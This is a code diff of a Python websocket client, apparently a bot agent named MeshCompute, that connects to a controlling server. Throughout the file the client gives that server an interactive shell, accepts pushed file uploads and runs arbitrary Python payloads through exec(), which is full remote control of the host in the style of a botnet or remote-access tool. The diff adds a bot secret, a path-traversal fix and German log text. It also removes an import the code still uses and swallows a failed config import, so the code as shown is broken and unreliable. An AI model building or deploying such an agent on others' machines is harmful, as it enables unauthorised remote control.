@@ -12,13 +12,16 @@ import base64
 from pathlib import Path
 from dotenv import load_dotenv
 import websockets
-from common.config import SERVER_URL, MAX_COMMAND_TIMEOUT
+try:
+    from config import BOT_ID, BOT_SECRET, SERVER_URL
+except ImportError:
+    pass
 
 load_dotenv()
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ---- BOT ID ----
+# ====================== BOT ID ======================
 BOT_ID_FILE = "client/bot_id.txt"
 if os.path.exists(BOT_ID_FILE):
     with open(BOT_ID_FILE, "r") as f:
@@ -29,7 +32,10 @@ else:
     with open(BOT_ID_FILE, "w") as f:
         f.write(BOT_ID)
 
-# ---- HELPER FUNCTIONS ----
+# Bot-Secret für Authentifizierung (optional, aber dringend empfohlen)
+BOT_SECRET = os.getenv("BOT_SECRET", "")
+
+# ====================== HELPER FUNCTIONS ======================
 async def get_system_info():
     return {
         "hostname": platform.node(),
@@ -65,21 +71,25 @@ async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-# ---- MAIN ----
+# ====================== MAIN ======================
 async def main():
-    print(f"MeshCompute Client started → {BOT_ID}")
+    print(f"MeshCompute Client gestartet → {BOT_ID}")
     while True:
         try:
             async with websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=40) as ws:
-                await ws.send(json.dumps({"type": "client", "bot_id": BOT_ID}))
-                logger.info(f"Connected as {BOT_ID}")
+                # Anmeldung mit Bot-ID und ggf. Secret
+                await ws.send(json.dumps({
+                    "type": "client",
+                    "bot_id": BOT_ID,
+                    "bot_secret": BOT_SECRET
+                }))
+                logger.info(f"✅ Verbunden als {BOT_ID}")
                 async for raw_msg in ws:
                     try:
                         msg = json.loads(raw_msg)
 
-                        # ---- INTERACTIVE SHELL ----
+                        # ====================== INTERACTIVE SHELL ======================
                         if msg.get("action") == "shell":
-                            # Start message with task_id so that the controller recognizes them
                             await ws.send(json.dumps({
                                 "type": "shell_output",
                                 "output": f"Shell gestartet auf {BOT_ID}\n",
@@ -96,7 +106,6 @@ async def main():
                                     "task_id": task_id
                                 }))
                                 continue
-                            # execute Commands
                             result = await execute_command(command)
                             output = result.get("output", "")
                             if result.get("error"):
@@ -108,7 +117,7 @@ async def main():
                                 "task_id": task_id
                             }))
 
-                        # ---- FILE UPLOAD ----
+                        # ====================== FILE UPLOAD ======================
                         elif msg.get("type") == "file_upload":
                             filename = msg.get("filename")
                             content_b64 = msg.get("content")
@@ -117,14 +126,16 @@ async def main():
                                 data = base64.b64decode(content_b64)
                                 upload_dir = Path("uploads")
                                 upload_dir.mkdir(exist_ok=True)
-                                file_path = upload_dir / filename
+                                # Path-Traversal verhindern: nur Dateiname extrahieren
+                                safe_filename = Path(filename).name
+                                file_path = upload_dir / safe_filename
                                 with open(file_path, "wb") as f:
                                     f.write(data)
                                 await ws.send(json.dumps({
                                     "type": "file_upload_done",
                                     "bot_id": BOT_ID,
                                     "task_id": task_id,
-                                    "filename": filename,
+                                    "filename": safe_filename,
                                     "path": str(file_path),
                                     "size": len(data)
                                 }))
@@ -138,7 +149,7 @@ async def main():
                                     "error": str(e)
                                 }))
 
-                        # ---- NORMAL COMMANDS ----
+                        # ====================== NORMALE COMMANDS ======================
                         elif "action" in msg:
                             action = msg["action"]
                             task_id = msg.get("task_id")
@@ -157,7 +168,6 @@ async def main():
                                     result["success"] = True
                                     result["info"] = await get_system_info()
                                 elif action == "python":
-                                    # Secure exec with limited globals dict
                                     exec_globals = {}
                                     exec(payload, exec_globals)
                                     result.update({
@@ -171,7 +181,7 @@ async def main():
                                 elif action == "ping":
                                     result.update({"success": True, "message": "pong"})
                                 else:
-                                    result.update({"success": False, "error": f"Unknown action: {action}"})
+                                    result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})
                             except Exception as e:
                                 result.update({"success": False, "error": str(e)})
                             await ws.send(json.dumps(result))
@@ -179,13 +189,13 @@ async def main():
                     except json.JSONDecodeError:
                         continue
                     except Exception as e:
-                        logger.warning(f"Message processing error: {e}")
+                        logger.warning(f"Nachrichtenverarbeitungsfehler: {e}")
 
         except websockets.exceptions.ConnectionClosed:
-            logger.warning("Lost connection to the server → Reconnect...")
+            logger.warning("Verbindung zum Server verloren → Reconnect...")
             await asyncio.sleep(3)
         except Exception as e:
-            logger.error(f"Connection failed: {e}")
+            logger.error(f"Verbindungsfehler: {e}")
             await asyncio.sleep(3)
 
 if __name__ == "__main__":
